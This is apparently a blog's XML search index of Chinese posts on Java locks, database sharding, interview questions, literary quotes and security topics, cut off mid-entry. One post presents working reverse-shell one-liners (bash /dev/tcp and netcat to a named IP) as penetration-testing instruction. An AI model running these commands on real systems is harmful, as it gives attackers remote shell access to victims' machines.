<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[java中的各种锁]]></title>
    <url>%2Fposts%2F2018-11-28-java%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%94%81.html</url>
    <content type="text"><![CDATA[一、 Java中锁的分类乐观锁乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。 java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。 悲观锁悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。 自旋锁自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。 线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。 如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。 非公平锁JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。 在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。 对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。 公平锁与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。 可重入锁（递归锁）可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。 ReadWriteLock 读写锁为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。 Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。 共享锁和独占锁java并发包中提供的加锁模式分别为共享锁和独占锁。 1、独占锁 独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。 2、共享锁 共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。 AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。 重量级锁Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。 轻量级锁锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。 随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。 “轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。 偏向锁Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。 分段锁分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。 二、 JAVA中几种锁的实现1、Synchronized 同步锁synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。 Synchronized的作用范围 当做用于方法时，锁住的对象是对象的实例（this）。 当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。 当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。 Synchronized 核心组件 Wait Set： 那些调用wait方法被阻塞的线程放置在这里Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeckOwner： 当前已经获取到资源锁的线程被称为Owner!Owner: 当前释放锁的线程 2、ReentrantLockReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。 ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。 3、Semaphore 信号量Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。 Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。 此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。 Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。 4、AtomicInteger此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference 将一个对象的所有操作转换为原子操作。 我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。 三、 锁的优化1、较少锁持有时间只在有线程安全的程序上加锁 2、减少锁粒度将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。 3、锁分离最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。 4、锁粗化通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。 5、锁消除锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>锁</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库拆分]]></title>
    <url>%2Fposts%2F2018-11-26-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8B%86%E5%88%86.html</url>
    <content type="text"><![CDATA[一、数据库的拆分当数据库的数据量非常大时，水平拆分和垂直拆分是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。 假设我们在数据库中有用户表1234567891011create table user( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), sign varchar(64), intro varchar(256) ...)engine=innodb charset=utf8; 水平拆分是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是： （1）每个库（表）的结构都一样 （2）每个库（表）的数据不一样，没有交集 （3）所有库（表）的并集是全量数据 垂直拆分是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是： （1）每个库（表）的结构都不一样 （2）一般来说每个库（表）的属性至少有一列交集，一般是主键 （3）所有库（表）的数据并集是全量数据 以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的： 12345678910111213141516create table user_base( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), ...)create table user_ext( id bigint, sign varchar(64), intro varchar(256), ...) 从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。 二、垂直拆分的依据是什么那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里 优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。 一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。 原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。（1）join更消耗数据库性能（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。 三、为什么要这样拆分为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里（2）内存buffer缓存数据是以row为单位的（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO 还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据（2）user_ext访问频率低，一行大小0.9k拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。 四、总结1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>数据库拆分</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生活-文艺到爆的句子]]></title>
    <url>%2Fposts%2F2018-11-26-%E7%94%9F%E6%B4%BB-%E6%96%87%E8%89%BA%E5%88%B0%E7%88%86%E7%9A%84%E5%8F%A5%E5%AD%90.html</url>
    <content type="text"><![CDATA[1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。 ——《允许自己虚度时光》 2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。 ——席慕蓉《独白》 3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。此生勿复见，山水不相逢。 ——钟意《摘录墙》 4、从童年起，我便独自一人，照顾着历代的星星。 ——《孤独》 5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。 ——余华《在细雨中呼喊》 6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。 7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。 8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。 ——上邪 9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。 ——太宰治 10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。 ——马良《坦白书》 11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。 ——韩松落《鲤.旅馆》 12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。 ——梵高写提奥的信 13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。 ——西蒙波伏娃 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>诗意</tag>
        <tag>文艺</tag>
        <tag>美句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞浅析]]></title>
    <url>%2Fposts%2F2018-11-13-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[0x01 前言 2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。 事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。 确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。 0x02 Java序列化和反序列化 今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程反序列化即逆过程，将字节流还原为对象 java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。 Java中的ObjectOutputStream类的writeObject 方法可以实现序列化，类ObjectInputStream类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。 12345678910111213141516171819public class TestSerialize()&#123; public static void main(String[] args)&#123; String s = "test"; // 将序列化对象写入文件中 FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(s); os.close; // 从文件中读取对象 FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象 String s1 = (String)ois.readObject(); ois.close(); &#125;&#125; 问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。 所以这个问题的根源在于ObjecInputStream在反序列化时，没有对生成的对象的类型做限制。 0x03 利用Apache Commons Collections实现远程代码执行 本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。 Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种转换，只需要调用decorate()函数，传入key和value的变换函数Transformer，就可以从任意Map对象生成相应的TransformedMap，decorate的函数如下： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)&#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; Transformer是一个接口，其中定义的transform()函数用来将一个对象转换为另一个对象，如下所示： 123public interface Transformer&#123; public Object transform(Object input);&#125; 当Map中的任意key或value更改时，相应的Transformer就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链ChainedTransformer。Apache Commons Collections已经实现了一些Transformer，其中有一个可以通过java的反射机制调用任意函数，叫做InvokerTransformer,代码如下： 123456public class InvokerTransformer implements Transformer, Serializable&#123; ... public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)&#123; &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反序列化</tag>
        <tag>Java</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找(下)]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8B.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找(上)]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8A.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-排序优化]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F%E4%BC%98%E5%8C%96.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell的三种方法]]></title>
    <url>%2Fposts%2F2018-11-06-Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[0x01 前言 在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。 0x02 获取shell 通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。 我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。 通过bash反弹shell第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令nc -lvvp 7777,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1。 bash -i的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。 下面来看一下具体的效果，先在攻击机器上监听端口： 在受害机器上反弹shell： 之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。 利用netcat反弹shell如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。 同样，先在攻击机器上130.211.244.96开启监听端口nc -lvvp 7777，等待受害机器连接。 在受害机器上执行命令nc -e /bin/bash 130.211.244.96 7777,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。 利用管道反弹shellnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。 首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。 然后在受害机器上执行命令nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。 这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。 当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反弹shell</tag>
        <tag>netcat</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、SQL优化的常见方法2、SQL索引的顺序、字段的顺序3、查看SQL索引4、Mysql分页查询语句5、Mysql的事物特性和隔离级别 事务特性(ACID) 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中 隔离级别： 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读 序列化读(Serializble)：串行化顺序执行大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。 6、sql having的使用场景7、Mysql数据库的索引及原理8、锁机制介绍：行锁、表锁、排它锁、共享锁9、乐观锁的业务场景和实现方式10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么12、JDBC如何实现事务、嵌套事务实现、分布式事务实现13、SQL的整个解析过程、执行过程原理、SQL行转列14、Redis为什么这么快，Redis采用多线程会有那些问题15、Redis支持那些数据结构String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合 16、Redsi跳表的问题17、Redsi单进程单线程如何能够高并发18、如何使用Redis实现分布式锁19、Redis分布式锁操作的原子性，Redsi内部是如何实现的 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Dubbo面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Dubbo%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、Dubbo完整的一次调用链路介绍2、Dubbo支持几种负载均衡策略3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？4、Dubbo启动的时候支持几种配置方式5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？6、Spring Cloud熔断机制 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面试</tag>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Spring%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、consul的可靠性2、spring的原理，AOP/IOC原理，使用场景3、spring bean生命周期4、什么是依赖注入DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。 5、Spring在SSM中起什么作用 spring： 是一个轻量级框架 作用： Bean工厂，用来管理Bean的声明周期和框架集成 两大核心： IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory AOP：面向切面编程 6、Spring的事务 编程式事务： 编程方式管理事务，灵活，但难管理 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务 7、IOC在项目中的作用IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。 8、Spring DI的注入方式 构造注入 set注入 接口注入 9、IOC、AOP实现原理 IOC：通过反射机制生成对象进行注入 AOP：通过动态代理 10、Spring MVC的架构/工作流程图 11、spring bean的作用域和生命周期12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？13、如何自定义一个spirng boot starter (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Java%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
